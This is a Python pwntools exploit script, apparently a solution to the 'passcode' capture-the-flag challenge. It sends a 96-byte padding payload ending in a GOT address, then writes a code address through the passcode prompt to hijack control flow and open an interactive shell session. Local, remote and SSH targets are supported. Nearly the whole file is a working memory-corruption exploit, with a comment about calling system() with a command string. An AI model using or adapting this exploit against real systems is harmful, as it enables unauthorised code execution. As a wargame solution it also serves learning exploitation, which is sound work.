#!/usr/bin/python3

#!/usr/bin/python
# coding=utf-8
# __author__:TaQini

from pwn import *

local_file = './passcode'
local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc  # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
    elf = ELF(local_file)
elif len(sys.argv) > 1:
    is_remote = True
    if sys.argv[1] == 'ssh':
        username, host = sys.argv[2].split('@')
        port = int(sys.argv[3])
        password = sys.argv[4]
        sh = ssh(username, host, port, password)
        p = sh.process(local_file)
        #elf = ELF(local_file)
    else :
        #len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)

    '''else:
        host, port = sys.argv[1].split(':')'''


#elf = ELF(local_file)

context.log_level = 'debug'
#context.arch = elf.arch


def se(data): return p.send(data)
def sa(delim, data): return p.sendafter(delim, data)
def sl(data): return p.sendline(data)


def sla(delim, data): return p.sendlineafter(delim, data)
def sea(delim, data): return p.sendafter(delim, data)
def rc(numb=4096): return p.recv(numb)
def ru(delims, drop=True): return p.recvuntil(delims, drop)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))


'''def debug(cmd=''):
    if is_local:
        attach(p, cmd)'''


# info


# rop1s
offset = 96
payload = b'A'*offset
payload += p32(0x0804a004)

# debug()
sla('enter you name : ',payload)
sla('enter passcode1 :',str(0x080485e3))
p.interactive()

# system()地址 + 命令字符串地址
